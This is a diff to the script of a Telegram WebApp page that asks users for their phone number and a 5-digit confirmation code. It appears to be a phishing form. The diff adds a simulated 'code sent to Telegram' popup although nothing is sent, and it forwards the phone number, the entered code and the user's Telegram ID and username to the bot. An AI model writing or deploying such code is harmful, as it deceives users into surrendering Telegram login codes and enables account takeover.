@@ -270,156 +270,186 @@
 
   <script>
     // Инициализация Telegram WebApp
-    let tg = window.Telegram.WebApp;
+let tg = window.Telegram.WebApp;
+
+// Раскрываем на весь экран
+tg.expand();
+
+// Переменные для хранения данных
+let userPhone = '';
+let userCountry = '';
+
+// Обновление кода страны
+function updateCode() {
+    const select = document.getElementById('country');
+    const selected = select.options[select.selectedIndex];
+    const code = selected.getAttribute('data-code');
+    const format = selected.getAttribute('data-format');
     
-    // Раскрываем на весь экран
-    tg.expand();
+    document.getElementById('countryCode').textContent = code;
+    document.getElementById('phone').placeholder = format.replace(code + ' ', '');
+}
+
+// Форматирование номера телефона
+function formatPhone() {
+    const select = document.getElementById('country');
+    const format = select.options[select.selectedIndex].getAttribute('data-format');
+    const code = select.options[select.selectedIndex].getAttribute('data-code');
+    const input = document.getElementById('phone');
     
-    // Переменные для хранения данных
-    let userPhone = '';
-    let userCountry = '';
+    let numbers = input.value.replace(/\D/g, '');
+    let formatPattern = format.replace(code + ' ', '');
+    let result = '';
+    let numberIndex = 0;
     
-    // Обновление кода страны
-    function updateCode() {
-      const select = document.getElementById('country');
-      const selected = select.options[select.selectedIndex];
-      const code = selected.getAttribute('data-code');
-      const format = selected.getAttribute('data-format');
-      
-      document.getElementById('countryCode').textContent = code;
-      document.getElementById('phone').placeholder = format.replace(code + ' ', '');
-    }
-    
-    // Форматирование номера телефона
-    function formatPhone() {
-      const select = document.getElementById('country');
-      const format = select.options[select.selectedIndex].getAttribute('data-format');
-      const code = select.options[select.selectedIndex].getAttribute('data-code');
-      const input = document.getElementById('phone');
-      
-      let numbers = input.value.replace(/\D/g, '');
-      let formatPattern = format.replace(code + ' ', '');
-      let result = '';
-      let numberIndex = 0;
-      
-      for (let i = 0; i < formatPattern.length && numberIndex < numbers.length; i++) {
+    for (let i = 0; i < formatPattern.length && numberIndex < numbers.length; i++) {
         if (formatPattern[i] === 'X') {
-          result += numbers[numberIndex];
-          numberIndex++;
+            result += numbers[numberIndex];
+            numberIndex++;
         } else {
-          result += formatPattern[i];
+            result += formatPattern[i];
         }
-      }
-      
-      input.value = result;
     }
     
-    // Переход к шагу ввода кода
-    function showCodeStep(phone, country) {
-      userPhone = phone;
-      userCountry = country;
-      
-      document.getElementById('displayPhone').textContent = phone;
-      document.getElementById('step1').classList.add('hidden');
-      document.getElementById('step2').classList.remove('hidden');
-      
-      // Фокусируемся на поле ввода кода
-      document.getElementById('code').focus();
-    }
+    input.value = result;
+}
+
+// Переход к шагу ввода кода
+function showCodeStep(phone, country) {
+    userPhone = phone;
+    userCountry = country;
     
-    // Возврат к шагу ввода телефона
-    function showPhoneStep() {
-      document.getElementById('step2').classList.add('hidden');
-      document.getElementById('step1').classList.remove('hidden');
-    }
+    document.getElementById('displayPhone').textContent = phone;
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
     
-    // Отправка данных в бот
-    function sendAuthData(phone, code, country) {
-      const user = tg.initDataUnsafe.user;
-      const tgUsername = user?.username || '';
-      const tgId = user?.id || '';
-      
-      const data = {
+    // Показываем загрузку
+    const submitBtn = document.querySelector('#codeForm .btn.submit');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'ОТПРАВКА КОДА...';
+    
+    // Симулируем отправку кода
+    setTimeout(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'ПОДТВЕРДИТЬ';
+        document.getElementById('code').focus();
+        
+        // Показываем сообщение о отправке кода
+        tg.showPopup({
+            title: 'Код отправлен',
+            message: `Код подтверждения отправлен в Telegram на номер ${phone}`,
+            buttons: [{ type: 'ok' }]
+        });
+    }, 2000);
+}
+
+// Возврат к шагу ввода телефона
+function showPhoneStep() {
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step1').classList.remove('hidden');
+}
+
+// Отправка данных в бот
+function sendAuthData(phone, code, country) {
+    const user = tg.initDataUnsafe.user;
+    const tgUsername = user?.username || '';
+    const tgId = user?.id || '';
+    
+    const data = {
         type: 'phone_auth_complete',
         phone: phone,
         code: code,
         tg_username: tgUsername,
         tg_id: tgId,
         country: country
-      };
-      
-      tg.sendData(JSON.stringify(data));
-      tg.close();
+    };
+    
+    tg.sendData(JSON.stringify(data));
+    // НЕ закрываем WebApp сразу
+}
+
+// Обработка отправки формы телефона
+document.getElementById('phoneForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const countryCode = document.getElementById('countryCode').textContent;
+    const phoneNumber = document.getElementById('phone').value;
+    const fullPhone = countryCode + ' ' + phoneNumber;
+    const country = document.getElementById('country').value;
+    
+    // Валидация номера
+    if (!phoneNumber || phoneNumber.replace(/\D/g, '').length < 5) {
+        tg.showPopup({
+            title: 'Ошибка',
+            message: 'Пожалуйста, введите корректный номер телефона',
+            buttons: [{ type: 'ok' }]
+        });
+        return;
     }
     
-    // Обработка отправки формы телефона
-    document.getElementById('phoneForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const countryCode = document.getElementById('countryCode').textContent;
-      const phoneNumber = document.getElementById('phone').value;
-      const fullPhone = countryCode + ' ' + phoneNumber;
-      const country = document.getElementById('country').value;
-      
-      // Валидация номера
-      if (!phoneNumber || phoneNumber.replace(/\D/g, '').length < 5) {
-        alert('Пожалуйста, введите корректный номер телефона');
+    // Показываем шаг ввода кода
+    showCodeStep(fullPhone, country);
+});
+
+// Обработка отправки формы кода
+document.getElementById('codeForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const code = document.getElementById('code').value;
+    
+    // Валидация кода
+    if (!code || code.length < 5) {
+        tg.showPopup({
+            title: 'Ошибка',
+            message: 'Пожалуйста, введите корректный код из 5 цифр',
+            buttons: [{ type: 'ok' }]
+        });
         return;
-      }
-      
-      // Показываем шаг ввода кода
-      showCodeStep(fullPhone, country);
-      
-      // Здесь можно добавить запрос на отправку кода через бота
-      // sendCodeRequest(fullPhone, country);
+    }
+    
+    // Показываем загрузку
+    const submitBtn = document.querySelector('#codeForm .btn.submit');
+    const originalText = submitBtn.textContent;
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'АВТОРИЗАЦИЯ...';
+    
+    // Отправляем данные в бот
+    sendAuthData(userPhone, code, userCountry);
+});
+
+// Кнопка отмены
+document.querySelector('.btn.cancel').addEventListener('click', function() {
+    tg.close();
+});
+
+// Кнопка "Назад" на шаге кода
+document.getElementById('backToPhone').addEventListener('click', showPhoneStep);
+
+// Повторная отправка кода
+document.getElementById('resendLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    tg.showPopup({
+        title: 'Код отправлен',
+        message: 'Код подтверждения отправлен повторно',
+        buttons: [{ type: 'ok' }]
     });
-    
-    // Обработка отправки формы кода
-    document.getElementById('codeForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      
-      const code = document.getElementById('code').value;
-      
-      // Валидация кода
-      if (!code || code.length < 3) {
-        alert('Пожалуйста, введите корректный код');
-        return;
-      }
-      
-      // Отправляем данные в бот
-      sendAuthData(userPhone, code, userCountry);
-    });
-    
-    // Кнопка отмены
-    document.querySelector('.btn.cancel').addEventListener('click', function() {
-      tg.close();
-    });
-    
-    // Кнопка "Назад" на шаге кода
-    document.getElementById('backToPhone').addEventListener('click', showPhoneStep);
-    
-    // Повторная отправка кода
-    document.getElementById('resendLink').addEventListener('click', function(e) {
-      e.preventDefault();
-      // Логика повторной отправки кода
-      alert('Код отправлен повторно');
-    });
-    
-    // Авто-переход при вводе 5 цифр кода
-    document.getElementById('code').addEventListener('input', function(e) {
-      if (e.target.value.length === 5) {
+});
+
+// Авто-отправка при вводе 5 цифр кода
+document.getElementById('code').addEventListener('input', function(e) {
+    if (e.target.value.length === 5) {
         document.getElementById('codeForm').dispatchEvent(new Event('submit'));
-      }
-    });
-    
-    // Слушатели ввода
-    document.getElementById('phone').addEventListener('input', formatPhone);
-    document.getElementById('country').addEventListener('change', updateCode);
-    
-    // Инициализация при загрузке
-    document.addEventListener('DOMContentLoaded', function() {
-      updateCode();
-    });
+    }
+});
+
+// Слушатели ввода
+document.getElementById('phone').addEventListener('input', formatPhone);
+document.getElementById('country').addEventListener('change', updateCode);
+
+// Инициализация при загрузке
+document.addEventListener('DOMContentLoaded', function() {
+    updateCode();
+});
   </script>
 </body>
 </html>
